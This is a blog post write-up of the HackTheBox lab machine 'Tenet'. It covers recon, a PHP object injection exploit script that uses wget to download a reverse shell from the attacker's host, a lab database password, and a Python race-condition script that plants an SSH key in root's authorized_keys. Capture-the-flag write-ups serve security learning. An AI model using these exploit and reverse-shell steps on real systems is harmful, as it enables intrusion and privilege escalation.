<!doctype html>
<html lang="en-us">
  <head>
    <title>HTB - Tenet // SixPraxis</title>
    <link rel="shortcut icon" href="/images/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.82.0" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="SixPraxis" />
    <meta name="description" content="Write Up for HackTheBox&#39;s Tenet" />
    <link rel="stylesheet" href="https://sixpraxis.github.io/css/main.min.802b52396e9009f466997720acea24d1773f8e6e5db6e4793067fa2dfd981e02.css" />

    
    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="HTB - Tenet"/>
<meta name="twitter:description" content="Write Up for HackTheBox&#39;s Tenet"/>

    <meta property="og:title" content="HTB - Tenet" />
<meta property="og:description" content="Write Up for HackTheBox&#39;s Tenet" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://sixpraxis.github.io/posts/tenet/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-06-12T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2021-06-12T00:00:00&#43;00:00" />



  </head>
  <body>
    <header class="app-header">
      <a href="https://sixpraxis.github.io"><img class="app-header-avatar" src="/images/avatar.png" alt="SixPraxis" /></a>
      <h1>SixPraxis</h1>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/">Home</a>
             - 
          
          <a class="app-header-menu-item" href="/tags/">Tags</a>
      </nav>
      <p>Mostly interested in networking and cyber security, but into all sorts of things.</p>
      <div class="app-header-social">
        
          <a href="https://github.com/sixpraxis" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
  <title>Github</title>
  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
</svg>
          </a>
        
          <a href="https://app.hackthebox.eu/profile/139574" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-htb">
  <title>HackTheBox</title>
  <path d="M11.996 0a1.119 1.119 0 0 0-.057.003a.9.9 0 0 0-.236.05a.907.907 0 0 0-.165.079L1.936 5.675a.889.889 0 0 0-.445.77V17.556a.889.889 0 0 0 .47.784l9.598 5.541l.054.029v.002a.857.857 0 0 0 .083.035l.012.004c.028.01.056.018.085.024c.01.001.011.003.016.004a.93.93 0 0 0 .296.015a.683.683 0 0 0 .086-.015c.01 0 .011-.002.016-.004a.94.94 0 0 0 .085-.024l.012-.004a.882.882 0 0 0 .083-.035v-.002a1.086 1.086 0 0 0 .054-.029l9.599-5.541a.889.889 0 0 0 .469-.784V6.48l-.001-.026v-.008a.889.889 0 0 0-.312-.676l-.029-.024c0-.002-.01-.005-.01-.007a.899.899 0 0 0-.107-.07L12.453.127A.887.887 0 0 0 11.99 0zm.01 2.253c.072 0 .144.019.209.056l6.537 3.774a.418.418 0 0 1 0 .724l-6.537 3.774a.418.418 0 0 1-.418 0L5.26 6.807a.418.418 0 0 1 0-.724l6.537-3.774a.42.42 0 0 1 .209-.056zm-8.08 6.458a.414.414 0 0 1 .215.057l6.524 3.766a.417.417 0 0 1 .208.361v7.533a.417.417 0 0 1-.626.361l-6.523-3.766a.417.417 0 0 1-.209-.362V9.13c0-.241.196-.414.41-.418zm16.16 0c.215.004.41.177.41.418v7.532c0 .15-.08.287-.208.362l-6.524 3.766a.417.417 0 0 1-.626-.361v-7.533c0-.149.08-.286.209-.36l6.523-3.767a.415.415 0 0 1 .216-.057z" fill="#626262"/>
</svg>
          </a>
        
      </div>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">HTB - Tenet</h1>
      <div class="post-meta">
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Jun 12, 2021
        </div>
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          4 min read
        </div>
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
  <title>tag</title>
  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
</svg>
              <a class="tag" href="https://sixpraxis.github.io/tags/hackthebox/">hackthebox</a>
              <a class="tag" href="https://sixpraxis.github.io/tags/tenet/">tenet</a>
              <a class="tag" href="https://sixpraxis.github.io/tags/medium/">medium</a>
        </div>
      </div>
    </header>
    <div class="post-content">
      <h1 id="tenet">Tenet</h1>
<p><img src="/images/htb-tenet/tenet.png" alt="Tenet"></p>
<h3 id="contents">Contents</h3>
<ul>
<li><a href="#WriteUp">Write Up</a></li>
<li><a href="#Recon">Recon</a></li>
<li><a href="#Credentials">Credentials</a></li>
<li><a href="#Notes">Notes</a></li>
</ul>
<h2 id="WriteUp">Write Up</h2>
<p>Two ports, 22 and 80. Pulling up 80 by IP shows the Apache2 Ubuntu Default Page, but pulling it up by tenet.htb after adding it to my hosts file pulls up a WordPress site. User &ldquo;protagonist&rdquo; has authored all of the posts, one comment by user &ldquo;neil&rdquo; who seems to be a part of the organization.</p>
<p>Possible lead in neil&rsquo;s comment <code>did you remove the sator php file and the backup??</code>. <a href="http://tenet.htb/sator.php">http://tenet.htb/sator.php</a> is a 404, but http://10.10.10.223/sator.php works and displays some text about grabbing some users from a text file and updating a database.</p>
<p><img src="/images/htb-tenet/tenet1.png" alt="sator.php"></p>
<p>http://10.10.10.223/users.txt just shows &ldquo;Success&rdquo;. Hitting it with a POST request doesn&rsquo;t have any result. What about the backup file? http://10.10.10.223/sator.php.backup fails, http://10.10.10.223/sator.php.back fails, http://10.10.10.223/sator.php.bak is downloadable! Looking at the code we spot an object injection vulnerability:</p>
<pre><code>$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);
</code></pre><p>$input becomes whatever we submit in a get request by appending ?arepo=, and the input isn&rsquo;t sanitized before being unserialized. We can modify the values for $user_file and $data. We can create our own php file and fill it with our own code. This script creates a new php file that downloads a reverse shell from my web server and starts it.</p>
<pre><code>&lt;?php

class DatabaseExport
{
	public $user_file = 'test1.php';
	public $data = '&lt;?php exec(&quot;wget http://10.10.14.8/php-reverse-shell.php.dl &amp;&amp; mv php-reverse-shell.php.dl php-reverse-shell.php&quot;); ?&gt;';
}

$url = 'http://10.10.10.223/sator.php?arepo=' . urlencode(serialize(new DatabaseExport));

echo 'Injecting object.. ';
exec('curl -s ' . $url);
echo 'Triggering new PHP code.. ';
exec('curl -s http://10.10.10.223/test1.php');
echo 'Starting reverse shell..';
exec('curl -s http://10.10.10.223/php-reverse-shell.php');
?&gt;
</code></pre><p>Now I&rsquo;m connected as www-data. Shell upgrade with <code>python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code>. I head over to the wordpress directory and pick up the MySQL credentials from wp-config.php, neil : Opera2112. That password works with <code>su neil</code>! Saves us the time of pulling the data from the wordpress database. We can now get the user flag and drop in our ssh public key.</p>
<p><img src="/images/htb-tenet/tenet2.png" alt="User Flag"></p>
<p>Sudo-l shows <code>(ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh</code>. Looking at this script, it creates a file in /tmp/ using a randomly generated filename that always starts with ssh-, then adds the hardcoded ssh public key in the file to that ssh- file, from there it appends the contents of the ssh- file to root&rsquo;s authorized_keys file, and finally deletes the ssh- file.</p>
<p>Relevant code:</p>
<pre><code>	tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)

	(umask 110; touch $tmpName)

	/bin/echo $key &gt;&gt;$tmpName

	checkFile $tmpName

	/bin/cat $tmpName &gt;&gt;/root/.ssh/authorized_keys

	/bin/rm $tmpName
</code></pre><p>If we can identify the file and write our own public key into the file before the script copies the contents into the authorized_keys, we should be able to sneak our own public key in.</p>
<pre><code>#!/bin/python3
import os

while True:
    dirList = os.listdir()
    for item in dirList:
        if &quot;ssh-&quot; in item:
            file = open(item, &quot;a&quot;)
            file.write(&quot;PUBLIC KEY HERE&quot;)
            file.close
            print(&quot;FILE WRITTEN&quot;)
</code></pre><p>I run this in the /tmp/ directory and then, from another shell, execute the enableSSH script as root.</p>
<p><img src="/images/htb-tenet/tenet4.png" alt="Success!"></p>
<p>The python script writes multiple times before the file is deleted by the bash script. <code>ssh root@10.10.10.223</code> successfully connects! We&rsquo;ve got root!</p>
<p><img src="/images/htb-tenet/tenet3.png" alt="Root flag"></p>
<hr>
<h2 id="Recon">Recon</h2>
<p>Initial Scan:</p>
<pre><code>nmap 10.10.10.223 -Pn

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
</code></pre><p>All ports scan shows no new ports.</p>
<p>Service/Script scan:</p>
<pre><code>nmap 10.10.10.223 -p22,80 -sC -sV -Pn

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.6
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Tenet
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre><p>WFuzz:</p>
<pre><code>wfuzz -c -u http://tenet.htb/FUZZ -w /usr/share/wordlists/dirb/big.txt --hc 404
Target: http://tenet.htb/FUZZ
Total requests: 20469
=====================================================================
ID           Response   Lines    Word       Chars       Payload                   
=====================================================================
000000016:   403        9 L      28 W       274 Ch      &quot;.htpasswd&quot;               
000000015:   403        9 L      28 W       274 Ch      &quot;.htaccess&quot;               
000016215:   403        9 L      28 W       274 Ch      &quot;server-status&quot;           
000019965:   301        9 L      28 W       312 Ch      &quot;wp-includes&quot;             
000019953:   301        9 L      28 W       311 Ch      &quot;wp-content&quot;              
000019949:   301        9 L      28 W       309 Ch      &quot;wp-admin&quot; 
</code></pre><hr>
<h2 id="Credentials">Credentials</h2>
<p>MySQL:</p>
<pre><code>'DB_NAME', 'wordpress' | neil : Opera2112
</code></pre><hr>
<h2 id="Notes">Notes</h2>
<ul>
<li>meta name=&ldquo;generator&rdquo; content=&ldquo;WordPress 5.6&rdquo;</li>
<li><a href="https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection">https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection</a></li>
</ul>

    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
